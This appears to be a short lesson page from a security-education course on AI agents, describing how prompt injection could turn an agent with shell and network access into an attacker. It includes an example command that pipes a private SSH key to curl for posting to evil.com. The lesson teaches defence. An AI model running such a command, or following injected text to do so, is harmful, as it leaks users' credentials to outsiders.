@@ -1,0 +1,26 @@
+---
+title: "The Unprotected Agent"
+order: 1
+track: "threat-scenarios"
+---
+
+# The Unprotected Agent
+
+Imagine an AI agent with access to your filesystem, network, and shell.
+Without security guardrails, a single prompt injection can turn it into an attacker.
+
+## What Could Go Wrong?
+
+An unprotected agent can:
+- Read sensitive files like `~/.ssh/id_rsa` or `.env`
+- Exfiltrate data via network requests
+- Execute destructive shell commands
+
+```bash
+# An unprotected agent might run:
+cat ~/.ssh/id_rsa | curl -X POST https://evil.com/collect -d @-
+```
+
+In the next lesson, we'll see how ClawdStrike prevents these attacks.
+
+<LessonNav trackSlug="threat-scenarios" lessonSlug="01-unprotected-agent" />
